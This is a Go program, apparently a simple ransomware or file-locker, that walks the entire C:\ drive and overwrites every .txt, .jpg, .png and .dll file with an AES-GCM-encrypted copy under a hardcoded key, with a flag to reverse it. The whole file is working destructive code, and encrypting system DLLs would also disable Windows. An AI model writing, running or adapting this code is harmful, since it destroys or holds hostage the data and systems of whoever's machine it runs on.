package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"crypto/rand"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"fmt"
	"flag"
)

//key if you encrypt all of your stuff 
const key = "3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd3ac5360e4e53c8586109912532fe94cf5c4d32e09504ad4156997cb15d2fc3fd53b574954d804529fd4407a5738dac878b9c42185fd38d90ecb5abffa16afecd53b574954d804529fd4407a5738dac878b9c42185fd38d90ecb5abffa16afecd"

func visit(files *[]string) filepath.WalkFunc {
    return func(path string, info os.FileInfo, err error) error {
        if err != nil {
			return nil
		} else {
			*files = append(*files, path)
			return nil
		}
      
    }
}

/*
Checks for errors when reading in files 
*/
func check(e error) {
    if e != nil {
        panic(e)
    }
}

func createHash(key string) []byte {
	hash := sha256.Sum256([]byte(key))
	return hash[:]
}

func encrypt(data []byte, passphrase string) []byte {
	block, _ := aes.NewCipher([]byte(createHash(passphrase)))
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		panic(err.Error())
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return ciphertext
}

func decrypt(data []byte, passphrase string) []byte {
	key := []byte(createHash(passphrase))
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		panic(err.Error())
	}
	return plaintext
}

func encryptFile(filename string, data []byte, passphrase string) {
	f, _ := os.Create(filename)
	defer f.Close()
	f.Write(encrypt(data, passphrase))
}

func decryptFile(filename string, passphrase string) []byte {
	data, _ := ioutil.ReadFile(filename)
	f, _ := os.Create(filename)
	f.Write(decrypt(data, passphrase))
	return decrypt(data, passphrase)
}

func main() {
	var files []string

	mode := flag.Int("mode", 1, "an int")
	flag.Parse()

	fmt.Println(*mode)
	if *mode != 1 && *mode != 2 {
		fmt.Println("Not a valid flag")
		return;
	}
	
	if *mode == 1{
		fmt.Println("encrypting")
	}

	if *mode == 2{
		fmt.Println("decrypting")
	}

	root := "C:\\"
	// root := "./toe"

	err := filepath.Walk(root, visit(&files))
	
    if err != nil {
		panic(err)
	}
	
    for _, file := range files {
		fileO, err := os.Open(file)
		fi, err := fileO.Stat();
		switch {
			case err != nil:
				// handle the error and return
			case fi.IsDir():
				// it's a directory
			default:
				// it's not a directory
				extension := filepath.Ext(file)
				if (extension == ".txt" || extension == ".jpg" || extension == ".png" || extension == ".dll"){
					dat, err := ioutil.ReadFile(file)
					// check(err)
					if err != nil {
						break
					}
					if *mode == 1 {
							encryptFile(file, dat, key)
						
					}
					if *mode  == 2 {
							decryptFile(file, key)
				
						
					}
			
				}
		}
	}
}
